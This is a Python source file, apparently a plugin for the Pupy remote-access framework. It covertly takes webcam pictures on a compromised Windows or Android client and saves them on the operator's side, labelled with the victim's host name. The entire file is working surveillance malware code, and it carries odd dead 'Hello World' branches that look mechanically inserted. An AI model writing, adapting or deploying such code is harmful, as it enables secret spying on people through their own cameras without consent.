from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
import os
import os.path
import logging
import datetime
import subprocess
__class_name__ = 'WebcamSnapModule'

def pil_save(filename, pixels, width, height):
    if False:
        print('Hello World!')
    from PIL import Image, ImageFile
    buffer_len = width * 3 + 3 & -4
    img = Image.frombuffer('RGB', (width, height), pixels, 'raw', 'BGR', buffer_len, 1)
    ImageFile.MAXBLOCK = width * height
    img = img.transpose(Image.FLIP_TOP_BOTTOM)
    img.save(filename, quality=95, optimize=True, progressive=True)
    logging.info('webcam snap saved to %s' % filename)

@config(cat='gather', compat=['windows', 'android'])
class WebcamSnapModule(PupyModule):
    """ take a webcam snap :) """
    dependencies = {'android': ['pupydroid.camera'], 'windows': ['vidcap']}

    @classmethod
    def init_argparse(cls):
        if False:
            print('Hello World!')
        cls.arg_parser = PupyArgumentParser(prog='webcam_snap', description=cls.__doc__)
        cls.arg_parser.add_argument('-d', '--device', type=int, default=0, help='take a webcam snap on a specific device (default: %(default)s)')
        cls.arg_parser.add_argument('-n', '--nb-cameras', action='store_true', help='print number of cameras (Android Only)')
        cls.arg_parser.add_argument('-q', '--jpg-quality', type=int, default=40, help='define jpg quality (Android Only) (default: %(default)s)')
        cls.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open eog on the snap for preview')

    def run(self, args):
        if False:
            print('Hello World!')
        try:
            os.makedirs(os.path.join('data', 'webcam_snaps'))
        except Exception:
            pass
        filepath = os.path.join('data', 'webcam_snaps', 'snap_' + self.client.short_name() + '_' + str(datetime.datetime.now()).replace(' ', '_').replace(':', '-') + '.jpg')
        if self.client.is_windows():
            dev = self.client.conn.modules['vidcap'].new_Dev(args.device, 0)
            self.info('device %s exists, taking a snap ...' % args.device)
            (buff, width, height) = dev.getbuffer()
            pil_save(filepath, buff, width, height)
        elif self.client.is_android():
            if args.nb_cameras:
                self.success('Number of cameras: {0}'.format(self.client.conn.modules['pupydroid.camera'].numberOfCameras()))
                return
            else:
                data = self.client.conn.modules['pupydroid.camera'].take_picture(args.device, args.jpg_quality)
                with open(filepath, 'w') as f:
                    f.write(data)
        if args.view:
            subprocess.Popen([self.client.pupsrv.config.get('default_viewers', 'image_viewer'), filepath])
        self.success('webcam picture saved to %s' % filepath)